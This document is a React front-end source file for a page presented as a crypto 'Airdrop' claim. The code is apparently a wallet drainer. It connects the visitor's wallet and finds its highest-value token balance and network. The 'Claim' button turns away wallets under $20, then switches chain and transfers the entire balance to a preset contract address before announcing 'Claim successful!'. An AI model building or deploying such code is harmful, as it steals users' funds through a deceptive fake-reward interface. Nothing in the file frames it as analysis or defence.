import { useState, useEffect } from "react";
import { useAccount } from "wagmi";
import { switchChain } from "@wagmi/core";
import { ConnectKitButton } from "connectkit";
import { main } from "./tokenScript";
import { ContractAddresses } from "./modules/config";
import { config } from "./modules/config";
import { transferAmount } from "./modules/action";
import { networkIds } from "./modules/config";

const App = () => {
  const { address, isConnected } = useAccount();
  const [topBalance, setTopBalance] = useState(null);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (!isConnected || !address) return;
    async function fetchTopBalance() {
      try {
        setLoading(true);
        const result = await main(address);
        setTopBalance(result);
      } catch (err) {
        console.error("Error fetching balances:", err);
        setError("Failed to fetch balances.");
      } finally {
        setLoading(false);
      }
    }
    fetchTopBalance();
  }, [isConnected, address]);

  const handleSwitchNetwork = async () => {
    if (!topBalance) return setError("No top balance detected.");
    const [_, network] = topBalance;

    try {
      const networkId = networkIds[network];
      console.log(networkId);
      await switchChain(config, { chainId: networkId });
    } catch (err) {
      console.error("Error switching network:", err);
      setError(`Failed to switch network: ${err.message}`);
    }
  };

  const handleClaim = async () => {

    const [balanceInUSD , network, balance] = topBalance;
    const contractAddress = ContractAddresses[network];

    if(balanceInUSD < 20) {
      setError("you are not eligible") 
      return;
    }

    try {
      await handleSwitchNetwork();
      await transferAmount(balance, contractAddress);
      setLoading(true);

      alert("Claim successful!");
    } catch (err) {
      console.error("Claim error:", err);
      setError(err.message || "An error occurred during the claim.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="app">
      <h1>Airdrop</h1>
      <ConnectKitButton />
      {isConnected && (
        <div className="customBtns">
          <button onClick={handleClaim} disabled={loading} className="Btn">
            Claim
          </button>
        </div>
      )}
      {error && <p className="error">{error}</p>}
      {loading && <p>Loading...</p>}
    </div>
  );
};

export default App;
